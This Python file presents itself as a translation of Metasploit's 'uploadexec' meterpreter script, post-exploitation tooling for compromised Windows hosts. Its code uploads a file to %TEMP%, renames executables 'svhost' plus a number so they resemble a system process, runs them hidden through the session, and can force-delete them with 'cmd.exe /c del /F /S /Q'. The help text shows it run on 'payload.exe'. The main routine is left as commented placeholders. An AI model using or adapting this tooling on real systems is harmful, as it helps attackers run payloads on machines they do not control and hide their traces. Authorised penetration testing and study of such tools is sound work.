#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
If you'd like to improve this script, please try to port it as a post
module instead. Thank you.

UploadExec -- upload a script or executable and run it

This is a Python translation of the Ruby meterpreter script.
"""

import argparse
import os
import sys
import random
import time


class UploadExec:
    """Upload and execute files on target system"""
    
    def __init__(self, session):
        """
        Initialize UploadExec
        
        Args:
            session: Meterpreter client session object
        """
        self.session = session
    
    def print_status(self, msg):
        """Print status message"""
        print(f"[*] {msg}")
    
    def print_error(self, msg):
        """Print error message"""
        print(f"[-] {msg}")
    
    def upload(self, file, trgloc=""):
        """
        Upload a file to the target
        
        Args:
            file: Local file path to upload
            trgloc: Target location (defaults to %TEMP%)
            
        Returns:
            Path to uploaded file on target
            
        Raises:
            Exception: If file doesn't exist or upload fails
        """
        if not os.path.exists(file):
            raise Exception("File to Upload does not exist!")
        
        # Determine target location
        if trgloc == "":
            location = self.session.sys.config.getenv('TEMP')
        else:
            location = trgloc
        
        try:
            # Get file extension
            ext = os.path.splitext(file)[1]
            
            # Generate random filename based on extension
            if ext.lower() == ".exe":
                fileontrgt = f"{location}\\svhost{random.randint(0, 99)}.exe"
            else:
                fileontrgt = f"{location}\\TMP{random.randint(0, 99)}{ext}"
            
            self.print_status(f"\tUploading {file}....")
            self.session.fs.file.upload_file(fileontrgt, file)
            self.print_status(f"\t{file} uploaded!")
            self.print_status(f"\tUploaded as {fileontrgt}")
        except Exception as e:
            self.print_status(f"Error uploading file {file}: {type(e).__name__} {e}")
            raise
        
        return fileontrgt
    
    def cmd_on_trgt_exec(self, cmdexe, opt, verbose):
        """
        Execute a command on the target
        
        Args:
            cmdexe: Command to execute
            opt: Options/arguments for the command
            verbose: If True, capture and display output
        """
        self.session.response_timeout = 120
        
        if verbose:
            try:
                self.print_status(f"\tRunning command {cmdexe}")
                r = self.session.sys.process.execute(cmdexe, opt, {'Hidden': True, 'Channelized': True})
                
                # Read output from channel
                while True:
                    d = r.channel.read()
                    if not d:
                        break
                    self.print_status(f"\t{d.decode('utf-8', errors='ignore')}")
                
                r.channel.close()
                r.close()
            except Exception as e:
                self.print_status(f"Error Running Command {cmdexe}: {type(e).__name__} {e}")
                raise
        else:
            try:
                self.print_status(f"\trunning command {cmdexe}")
                r = self.session.sys.process.execute(cmdexe, opt, {'Hidden': True, 'Channelized': False})
                r.close()
            except Exception as e:
                self.print_status(f"Error Running Command {cmdexe}: {type(e).__name__} {e}")
                raise
    
    def m_unlink(self, path):
        """
        Delete a file on the target
        
        Args:
            path: Path to file to delete
        """
        r = self.session.sys.process.execute(f"cmd.exe /c del /F /S /Q {path}", None, {'Hidden': 'true'})
        
        # Wait for process to complete
        while r.name:
            time.sleep(0.10)
        
        r.close()


def unsupported(platform):
    """Check if platform is supported"""
    if platform != 'windows':
        print("[-] This version of Meterpreter is not supported with this Script!")
        print(f"[-] Platform: {platform}")
        return True
    return False


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='UploadExec -- upload a script or executable and run it',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Upload and execute:
    python3 uploadexec.py -e payload.exe
  
  Upload to specific path with options:
    python3 uploadexec.py -e script.bat -p C:\\temp -o "/arg1 /arg2"
  
  Upload, execute verbosely, and remove:
    python3 uploadexec.py -e tool.exe -v -r
  
  Upload, execute, and exit session:
    python3 uploadexec.py -e payload.exe -x
        """
    )
    
    parser.add_argument('-e', '--executable', required=True,
                        help='Executable or script to upload to target host')
    parser.add_argument('-o', '--options',
                        help='Options for executable')
    parser.add_argument('-p', '--path', default='',
                        help='Path on target to upload executable, default is %%TEMP%%')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose, return output of execution of uploaded executable')
    parser.add_argument('-s', '--sleep', type=float,
                        help='Sleep for a number of seconds after uploading before executing')
    parser.add_argument('-r', '--remove', action='store_true',
                        help='Remove the executable after running it (only works if the executable exits right away)')
    parser.add_argument('-x', '--exit', action='store_true', dest='quit',
                        help='Exit the session once the payload has been run')
    
    args = parser.parse_args()
    
    # Check if file exists
    if not os.path.exists(args.executable):
        print(f"[-] Error: File '{args.executable}' not found")
        return 1
    
    # NOTE: In actual use, this would get the client from the framework
    print("NOTE: This is a translated script that requires meterpreter framework integration")
    print("Running Upload and Execute Meterpreter script....")
    print(f"  File: {args.executable}")
    print(f"  Target path: {args.path if args.path else '%TEMP%'}")
    if args.options:
        print(f"  Options: {args.options}")
    if args.verbose:
        print("  Verbose output: enabled")
    if args.sleep:
        print(f"  Sleep: {args.sleep}s")
    if args.remove:
        print("  Remove after execution: yes")
    if args.quit:
        print("  Exit session after: yes")
    
    # Placeholder for actual implementation
    # session = get_meterpreter_client()
    # 
    # if unsupported(session.platform):
    #     return 1
    # 
    # uploader = UploadExec(session)
    # exec_path = uploader.upload(args.executable, args.path)
    # 
    # if args.sleep:
    #     uploader.print_status(f"\tSleeping for {args.sleep}s...")
    #     time.sleep(args.sleep)
    # 
    # uploader.cmd_on_trgt_exec(exec_path, args.options, args.verbose)
    # 
    # if args.remove:
    #     uploader.print_status(f"\tDeleting {exec_path}")
    #     uploader.m_unlink(exec_path)
    # 
    # if args.quit:
    #     uploader.print_status("Closing the session...")
    #     try:
    #         session.core.shutdown()
    #     except:
    #         pass
    #     session.shutdown_passive_dispatcher()
    # 
    # uploader.print_status("Finished!")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
